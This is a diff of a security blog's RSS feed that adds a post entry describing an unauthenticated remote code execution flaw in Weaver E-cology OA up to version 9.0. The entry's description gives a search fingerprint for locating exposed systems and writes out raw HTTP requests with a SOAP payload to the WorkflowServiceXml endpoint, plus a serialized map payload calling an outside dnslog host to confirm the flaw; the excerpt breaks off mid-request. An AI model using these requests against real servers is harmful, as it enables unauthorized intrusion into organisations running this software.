@@ -6,7 +6,22 @@
     <description>Recent content in Posts on Olist.213</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Mon, 19 Apr 2021 15:28:47 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 17 May 2021 19:28:31 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>E Cology WorkflowServiceXml RCE</title>
+      <link>https://olist213.github.io/posts/e-cology-workflowservicexml-rce/</link>
+      <pubDate>Mon, 17 May 2021 19:28:31 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/e-cology-workflowservicexml-rce/</guid>
+      <description>漏洞描述 泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行
+漏洞影响   E-cology &amp;lt;= 9.0
+  app=&amp;ldquo;泛微-协同办公OA&amp;rdquo;
+  漏洞复现 1、构造如下请求，返回Invaild SOAP request表示漏洞存在。
+2、POST如下请求：
+GET /services%20/WorkflowServiceXml HTTP/1.1 Host: x.x.19.86:88 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept-Encoding: gzip, deflate Connection: close content-type: text/xml;charset=UTF-8 Content-Length: 347 &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34; xmlns:web=&amp;#34;webservices.services.weaver.com.cn&amp;#34;&amp;gt; &amp;lt;soapenv:Header/&amp;gt; &amp;lt;soapenv:Body&amp;gt; &amp;lt;web:doCreateWorkflowRequest&amp;gt; &amp;lt;web:string&amp;gt;&amp;lt;/web:string&amp;gt; &amp;lt;web:string&amp;gt;2&amp;lt;/web:string&amp;gt; &amp;lt;/web:doCreateWorkflowRequest&amp;gt; &amp;lt;/soapenv:Body&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt; 3、利用dnslog服务器进行请求，在web:string中加入如下内容,url为dnslog的地址：
+&amp;lt;map&amp;gt; &amp;lt;entry&amp;gt; &amp;lt;url&amp;gt;http://1xsz12.dnslog.cn&amp;lt;/url&amp;gt; &amp;lt;string&amp;gt;http://1xsz12.dnslog.cn&amp;lt;/string&amp;gt; &amp;lt;/entry&amp;gt; &amp;lt;/map&amp;gt; 4、将上述内容进行html转义，利用burp的功能。GET /services%20/WorkflowServiceXml HTTP/1.1 Host: x.x.19.86:88 User-Agent: Mozilla/5.</description>
+    </item>
+    
     <item>
       <title>vs2019编译masscan</title>
       <link>https://olist213.github.io/posts/vs2019-build-masscan/</link>
